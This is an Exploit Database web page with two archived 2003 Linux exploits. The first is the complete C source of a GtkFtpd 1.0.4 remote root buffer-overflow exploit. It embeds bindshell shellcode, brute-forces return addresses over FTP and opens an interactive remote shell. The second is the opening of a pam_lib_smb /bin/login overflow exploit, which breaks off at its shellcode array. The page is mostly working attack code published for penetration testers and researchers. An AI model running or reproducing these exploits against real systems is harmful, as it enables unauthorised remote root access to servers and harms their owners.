Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 88
GtkFtpd 1.0.4 - Remote Buffer Overflow - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDGtkFtpd 1.0.4 - Remote Buffer OverflowEDB-ID:88CVE:2003-0755EDB Verified:Author:vade79Type:remoteExploit:/Platform:LinuxDate:2003-08-28Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*********************************************************** [ gtkftpd[v1.0.4(and below)]: remote root buffer overflow exploit. ]** by: vade79/v9 v9 at fakehalo.deadpig.org (fakehalo/realhalo)** Url:* http://gtkftpd.sourceforge.net/** GtkFtpd, versions v1.0.4 and below(as of this time), contain a* remotely exploitable buffer overflow. the overflow occurs when* GtkFtpd allocates the appropriate amount of memory to hold a* filename or directory(256 bytes), but does not account for the* date/user/stat prefix(~40 bytes) it prepends to the buffer.** When exploited, things are made easier due to the fact that* GtkFtpd does not chroot() or drop its root privileges(as are* required to run the program itself) while running. And one step* more easier because when the buffer is overflown it is in a child* process, making it possible to brute force(not crash).** Requirements to exploit:* - A valid account. (user/pass, anonymous will do)* - A writable directory. (usually gtkftpd makes any dir writable)** Usage:* # cc xgtkftpd.c -o xgtkftpd* # ./xgtkftpd [-Psupcbanrd] -h hostname* ** Exploit workings(ftp commands):* MKDIR <large name/causes overflow>* LIST -<shellcode> (where the overflow occurs)** The exploitable code itself is found in src/sys_cmd.c:* 12:#define BUF_SIZE 256* 21:char buf[BUF_SIZE];* 57:sprintf(buf, "%s\t%s", perm_date_siz, entr->d_name);** Note:* Make sure the directory used to "LIST" does not already contain* any large filenames or directories, as the first overly long one* to list will cause the overflow. (which will fail the exploit)* ** (should work out of the box on generic linux, tested on rh7.1.* squished, un-tab'd, un-space'd, exploit code; just how i like it.)**********************************************************/#include <stdio.h>#include <stdlib.h>#include <stdarg.h>#include <string.h>#include <unistd.h>#include <signal.h>#include <getopt.h>#include <ctype.h>#include <time.h>#include <netdb.h>#include <sys/socket.h>#include <sys/types.h>#include <sys/time.h>#include <netinet/in.h>#include <arpa/inet.h>/* default definitions, change at will. */#define DFLUSER "anonymous" /* no argument, default username. */#define DFLPASS "null@null.com" /* no argument, default password. */#define DFLDIR "/incoming" /* no argument, default +w directory. */#define DFLCLM 80 /* default screen width to use. */#define DFLADDR 0xbffffffa /* base brute address. */#define TIMEOUT 10 /* connection timeout. */static char x86_exec[]= /* bindshell(sport), modded from netric. *//* port defined in byte 20, and 21; in a 'short' cast form. */"\x31\xc0\x50\x40\x89\xc3\x50\x40\x50\x89\xe1\xb0\x66\xcd\x80\x31""\xd2\x52\x66\x68\x00\x00\x43\x66\x53\x89\xe1\x6a\x10\x51\x50\x89""\xe1\xb0\x66\xcd\x80\x40\x89\x44\x24\x04\x43\x43\xb0\x66\xcd\x80""\x83\xc4\x0c\x52\x52\x43\xb0\x66\xcd\x80\x93\x89\xd1\xb0\x3f\xcd""\x80\x41\x80\xf9\x03\x75\xf6\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f""\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";/* protos/functions. */char *getdir(unsigned int);char *getbdir(void);char *getcode(void);void filter_text(char *);void ftp_printf(int,char *,...);void ftp_clean(int);void ftp_read(int);void ftp_parse(int);void ftp_connect(void);void getshell(int,unsigned int);void printe(char *,short);void usage(char *);void sig_ctrlc(){printe("user aborted.",1);}void sig_alarm(){printe("alarm/timeout hit.",1);}void sig_pipe(){printe("connection closed/failed.",1);}/* globals. (ease of use throughout) */unsigned short align=2; /* probably will never need to be otherwise. */unsigned short port=21; /* generic ftp daemon port. */unsigned short sport=7979; /* generic bindshell port. */unsigned short reverse=0; /* go upward, instead of downward */unsigned short no_io=0; /* do not show traffic. */unsigned int attempts=100; /* number of times to brute. */unsigned int columns=80; /* generic screen width. */unsigned int ftp_i=0; /* Nth time read ftp socket. */unsigned int baseaddr=DFLADDR; /* base address. (again) */char *host; /* hostname/target, a must have. */char *user; /* username to use. */char *pass; /* password to use. */char *writedir; /* need a writable directory. */char *basedir; /* gets filled in later. *//* program start. */int main(int argc,char **argv){int chr=0;printf("[*] gtkftpd[v1.0.4(and below)]: remote root buffer overflow"" exploit.\n[*] by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)\n\n");/* set the chomp point, filter long lines. */if(getenv("COLUMNS"))columns=atoi(getenv("COLUMNS"));if(7>columns||columns>256)columns=DFLCLM;while((chr=getopt(argc,argv,"h:P:s:u:p:c:b:a:n:rd"))!=EOF){switch(chr){case 'h':if(!host&&!(host=(char *)strdup(optarg)))printe("main(): allocating memory failed.",1);break;case 'P':port=atoi(optarg);break;case 's':sport=atoi(optarg);break;case 'u':if(!user&&!(user=(char *)strdup(optarg)))printe("main(): allocating memory failed.",1);break;case 'p':if(!pass&&!(pass=(char *)strdup(optarg)))printe("main(): allocating memory failed.",1);break;case 'c':if(!writedir&&!(writedir=(char *)strdup(optarg)))printe("main(): allocating memory failed.",1);break;case 'b':sscanf(optarg,"%x",&baseaddr);break;case 'a':align=atoi(optarg);break;case 'n':attempts=atoi(optarg);break;case 'r':reverse=1;break;case 'd':no_io=1;break;default:usage(argv[0]);break;}}if(!host)usage(argv[0]);/* fill in the blanks, or out of bounds. */if(!user)user=DFLUSER;if(!pass)pass=DFLPASS;if(!writedir)writedir=DFLDIR;if(!baseaddr)baseaddr=DFLADDR;if(align>3)align=2;if(!((sport&0xff00)>>8)||!(sport&0x00ff)){printf("[!] shell port defined contains null byte(s), using default.\n");sport=7979; /* back to default. */}/* change the bindshell port. */x86_exec[20]=(sport&0xff00)>>8;x86_exec[21]=(sport&0x00ff);/* verbose. */printf("[*] target: %s:%d, identity: %s:%s.\n[*] directory: %s, brute"" start: 0x%.8x, alignment: %d.\n[*] memory direction: %s, attempts: ""%d, bindshell port: %d.\n\n",host,port,user,pass,writedir,baseaddr,align,(!reverse?"downward":"upward"),attempts,sport);signal(SIGINT,sig_ctrlc); /* explained/pretty exit. */signal(SIGPIPE,sig_pipe); /* handle abnormal disconnects. */ftp_connect(); /* do the magic, brute force. */printe("brute force exhausted, failed.",0);exit(0);}char *getdir(unsigned int offset){unsigned int i=0;char *buf;/* 256 will fail; 255 or less. */if(!(buf=(char *)malloc(255+1)))printe("getdir(): allocating memory failed.",1);memset(buf,0x0,255+1);if(align)memset(buf,'x',align);for(i=align;i<252;i+=4){if(!reverse)*(long *)&buf[i]=(baseaddr-offset);else *(long *)&buf[i]=(baseaddr+offset);}return(buf);}char *getbdir(void){char *buf;time_t ttt;struct tm *ttm;if(!(buf=(char *)malloc(32+1)))printe("getbdir(): allocating memory failed",1);ttt=time(NULL);ttm=localtime(&ttt);strftime(buf,32,"tmp_%H:%M:%S_%d-%m-%Y",ttm);return(buf);}char *getcode(void){char *buf;if(!(buf=(char *)malloc(512+1)))printe("getcode(): allocating memory failed",1);memset(buf,0x90,(512-strlen(x86_exec)));memcpy(buf+(512-strlen(x86_exec)),x86_exec,strlen(x86_exec));return(buf);}void filter_text(char *ptr){unsigned int i=0;for(i=0;i<strlen(ptr);i++){/* keep it short and sweet. */if(i>=(columns-3)){ptr[i--]=0x0;ptr[i--]='.';ptr[i--]='.';ptr[i]='.';}/* don't make \r or \n a '?'. */else if(ptr[i]=='\r'||ptr[i]=='\n')ptr[i]=0x0;/* don't ugly the local terminal. */else if(!isprint(ptr[i]))ptr[i]='?';}return;}void ftp_printf(int sock,char *fmt,...){char *buf;va_list ap;if(!(buf=(char *)malloc(1024+1)))printe("ftp_printf(): allocating memory failed.",1);memset(buf,0x0,1024+1);va_start(ap,fmt);vsnprintf(buf,1024,fmt,ap);va_end(ap);write(sock,buf,strlen(buf)); /* write it, then mod it for display. */filter_text(buf);if(!no_io)printf("-> %s\n",buf);free(buf);return;}void ftp_clean(int sock){ftp_printf(sock,"CWD ..\r\n");ftp_read(sock);ftp_printf(sock,"RMD %s\r\n",basedir);ftp_read(sock);ftp_printf(sock,"QUIT\r\n");ftp_read(sock);return;}void ftp_read(int sock){char *buf;if(!(buf=(char *)malloc(1024+1)))printe("ftp_read(): allocating memory failed.",1);memset(buf,0x0,1024);read(sock,buf,1024);filter_text(buf);if(!no_io)printf("<- %s\n",buf);/* some initial reply checking, not too much. */if(!ftp_i)if(!strstr(buf,"GtkFTPd"))printe("this exploit is only for GtkFTPd, failed.",1);if(ftp_i==2)if(strncmp(buf,"230",3))printe("invalid username/password, failed.",1);if(ftp_i==3)if(strncmp(buf,"250",3))printe("invalid writable directory, failed. (try \"/\")",1);free(buf);ftp_i++; /* increase the response identifier. */return;}void ftp_parse(int sock){unsigned int offset=0;ftp_read(sock); /* get the banner. */ftp_printf(sock,"USER %s\r\n",user);ftp_read(sock);ftp_printf(sock,"PASS %s\r\n",pass);ftp_read(sock);ftp_printf(sock,"CWD %s\r\n",writedir);ftp_read(sock);basedir=getbdir(); /* tmp dir of our own to use. */ftp_printf(sock,"MKD %s\r\n",basedir);ftp_read(sock);ftp_printf(sock,"CWD %s\r\n",basedir);ftp_read(sock);while(offset<(attempts*400)){ /* if it hasn't yet, it's not going to. *//* slight null-byte/CR check, only needs to check the last byte. */if((!reverse&&!((baseaddr-offset)&0xff))||(reverse&&!((baseaddr+offset)&0xff))||(!reverse&&((baseaddr-offset)&0xff)=='\n')||(reverse&&((baseaddr+offset)&0xff)=='\n')){printf("[!] brute address contains null-byte/CR, increasing offset ""by one byte.\n");offset++; /* one byte off if reversed won't hurt here. (401) */}/* make the evil oversized directory. (255 or less bytes) */ftp_printf(sock,"MKD %s\r\n",getdir(offset));ftp_read(sock);/* date+directory exceeds 256 byte buffer, the exploit. */sleep(1); /* delay insurance. */ftp_printf(sock,"LIST -%s\r\n",getcode());/* nothing to read here, and gtkftpd processes (the exploit) *//* before the ftp list connection is made, making it *//* pointless to view the list. */sleep(1); /* delay insurance, again, just to be sure. *//* delete directory, multiples will cause failure(s). */ftp_printf(sock,"RMD %s\r\n",getdir(offset));ftp_read(sock);getshell(sock,offset);offset+=400; /* always at least 400 nops in a row, in shellcode. */}ftp_clean(sock);close(sock);return;}void ftp_connect(void){int sock;struct hostent *t;struct sockaddr_in s;sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);s.sin_family=AF_INET;s.sin_port=htons(port);if((s.sin_addr.s_addr=inet_addr(host))){if(!(t=gethostbyname(host)))printe("couldn't resolve hostname.",1);memcpy((char*)&s.sin_addr,(char*)t->h_addr,sizeof(s.sin_addr));}printf("[*] attempting to connect: %s:%d.\n",host,port);signal(SIGALRM,sig_alarm);alarm(TIMEOUT);if(connect(sock,(struct sockaddr *)&s,sizeof(s)))printe("gtkftpd connection failed.",1);alarm(0);printf("[*] connected successfully: %s:%d.\n",host,port);ftp_parse(sock);return;}void getshell(int ftpsock,unsigned int offset){int sock,r;fd_set fds;char buf[4096+1];struct hostent *he;struct sockaddr_in sa;if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)printe("getshell(): socket() failed.",1);sa.sin_family=AF_INET;if((sa.sin_addr.s_addr=inet_addr(host))){if(!(he=gethostbyname(host)))printe("getshell(): couldn't resolve.",1);memcpy((char *)&sa.sin_addr,(char *)he->h_addr,sizeof(sa.sin_addr));}sa.sin_port=htons(sport);signal(SIGALRM,sig_alarm);alarm(TIMEOUT);printf("[*] checking for bindshell: %s:%d. (0x%.8x)\n",host,sport,(!reverse?(baseaddr-offset):(baseaddr+offset)));if(connect(sock,(struct sockaddr *)&sa,sizeof(sa))){printf("[!] connection failed: %s:%d.\n",host,sport);close(sock); /* don't want fd's to fill up. */alarm(0);return;}alarm(0);printf("[*] successfully connected: %s:%d.\n",host,sport);printf("[*] attempting to cleanup leftover directory(s).\n");ftp_clean(ftpsock);close(ftpsock);printf("[*] entering remote shell. (%s:%d)\n\n",host,sport);signal(SIGINT,SIG_IGN);write(sock,"cd /;uname -a;id\n",18);while(1){FD_ZERO(&fds);FD_SET(0,&fds);FD_SET(sock,&fds);if(select(sock+1,&fds,0,0,0)<1)printe("getshell(): select() failed.",1);if(FD_ISSET(0,&fds)){if((r=read(0,buf,4096))<1)printe("getshell(): read() failed.",1);if(write(sock,buf,r)!=r)printe("getshell(): write() failed.",1);}if(FD_ISSET(sock,&fds)){if((r=read(sock,buf,4096))<1)exit(0);write(1,buf,r);}}close(sock);return;}void printe(char *err,short e){printf("[!] error: %s\n",err);if(e)exit(1);return;}void usage(char *name){printf(" usage: %s [options] -h hostname\n\n options:\n"" -h <string>\tdefines the target host/ip.\t(REQUIRED)\n"" -P <number>\tdefines the target port.\t(%d)\n"" -s <number>\tdefines the bindshell port.\t(%d)\n"" -u <string>\tdefines the username.\t\t(\"%s\")\n"" -p <string>\tdefines the password.\t\t(\"%s\")\n"" -c <string>\tdefines the writable directory.\t(\"%s\")\n"" -b <string>\tdefines the base brute address.\t(0x%.8x)\n"" -a <number>\tdefines the alignment.\t\t(%d)\n"" -n <number>\tdefines the number of attempts.\t(%d)\n"" -r\t\tgo upward in memory, instead of downward.\n"" -d\t\tdo not show verbose ftp in/out traffic.\n\n",name,port,sport,DFLUSER,DFLPASS,DFLDIR,DFLADDR,align,attempts);exit(0);}// milw0rm.com [2003-08-28]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 89
Linux pam_lib_smb < 1.1.6 - '/bin/login' Remote Overflow - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDLinux pam_lib_smb < 1.1.6 - '/bin/login' Remote OverflowEDB-ID:89CVE:2003-0686EDB Verified:Author:vertexType:remoteExploit:/Platform:LinuxDate:2003-08-29Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/** Linux pam_lib_smb < 1.1.6  /bin/login exploit* by vertex** Tested on Redhat 8.0, 9.0*** Advisory at* 	http://us2.samba.org/samba/ftp/pam_smb/** code based on : UC_login.c* SunOS 5.6,5.7,5.8 remote /bin/login root exploit* [mikecc/unixclan]** =============================================================* In order to use pam_lib_smb, need to add following line on top* of /etc/pam.d/login** auth       required     /lib/security/pam_smb_auth.so** And config the /etc/pam_smb.conf correctly.**/#include <stdio.h>#include <string.h>#include <stdlib.h>#include <arpa/inet.h>#include <arpa/telnet.h>#include <sys/socket.h>#include <sys/types.h>#include <netdb.h>#include <unistd.h>#include <getopt.h>/* first negotiate *//* packet capture by ethereal */char packet_1[] = {0xff, 0xfd, 0x03, 0xff, 0xfb, 0x18, 0xff, 0xfb,0x1f, 0xff, 0xfb, 0x20, 0xff, 0xfb, 0x21, 0xff,0xfb, 0x22, 0xff, 0xfb, 0x27, 0xff, 0xfd, 0x05,0xff, 0xfb, 0x23 };char packet_2[] = {0xff, 0xfa, 0x1f, 0x00, 0x62, 0x00, 0x22, 0xff,0xf0, 0xff, 0xfa, 0x20, 0x00, 0x33, 0x38, 0x34,0x30, 0x30, 0x2c, 0x33, 0x38, 0x34, 0x30, 0x30,0xff, 0xf0, 0xff, 0xfa, 0x23, 0x00, 0x6c, 0x69,0x64, 0x73,/* in between ,adding sc */0x3a, 0x30, 0xff, 0xf0, 0xff, 0xfa,0x27, 0x00, 0x03, 0x58, 0x41, 0x55, 0x54, 0x48,0x4f, 0x52, 0x49, 0x54, 0x59, 0x01, 0x2f, 0x68,0x6f, 0x6d, 0x65, 0x2f, 0x78, 0x69, 0x65, 0x2f,0x2e, 0x58, 0x61, 0x75, 0x74, 0x68, 0x6f, 0x72,0x69, 0x74, 0x79, 0x00, 0x44, 0x49, 0x53, 0x50,0x4c, 0x41, 0x59, 0x01,};char packet_2_1[]={0x6c, 0x69, 0x64, 0x73,0x3a, 0x30, 0xff, 0xf0, 0xff, 0xfa, 0x18, 0x00,0x58, 0x54, 0x45, 0x52, 0x4d, 0xff, 0xf0 };/* here is the TERM value *//**/void login(int);void negotiate(int);void sendstr(int,char *,int);void wont(int sd,int opt);void will(int sd,int opt);void cmd(int sd,int opt);/* ascii shellcode by shellforge (by phillipe biodi)*/unsigned char sc[] 